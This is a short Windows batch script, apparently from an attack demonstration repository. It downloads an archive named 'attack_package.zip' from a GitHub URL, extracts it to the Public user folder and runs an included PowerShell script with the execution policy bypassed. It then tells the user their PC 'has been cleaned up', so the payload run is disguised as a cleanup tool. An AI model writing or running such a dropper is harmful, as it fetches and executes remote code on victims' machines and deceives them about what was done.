@echo off

set URL=https://raw.githubusercontent.com/cyberattackerdemo/public/main/attack_package.zip
set ZIP=C:\Users\Public\attack_package.zip
set DEST=C:\Users\Public

curl -L -o "%ZIP%" "%URL%"

powershell -Command "Expand-Archive -Path '%ZIP%' -DestinationPath '%DEST%' -Force"

powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\first_step.ps1"

echo Your PC has been cleaned up...
pause